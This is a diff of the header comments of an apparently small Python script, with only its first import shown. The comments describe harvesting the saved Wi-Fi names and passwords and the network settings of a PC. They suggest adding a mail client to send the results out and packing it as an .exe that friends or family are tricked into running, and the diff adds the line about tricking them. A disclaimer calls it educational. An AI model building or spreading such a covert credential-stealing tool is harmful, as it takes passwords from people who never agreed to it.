@@ -1,12 +1,15 @@
-#About the code 
-
+#About The Code 
 #this code allows you to get the names of the wifi and passwords that the users PC has ever connected with
 #code also outputs the IPv4,Subnet Mask and the Default Gateway of the users PC
+
+#Further Building 
 #you can build up on this by adding a mail client in the code which sends you the output through mail
 #then finally converting the whole file in an ".exe" file to play a small trick on your friends or family members
+#by making them run the command and you getting all in the info in your mail 
 
 #I take no responsibly on the use of this code for illegal stuff,this is purely for educational purposes only
 
+#Main Code Starts Below 
 
 import subprocess
 
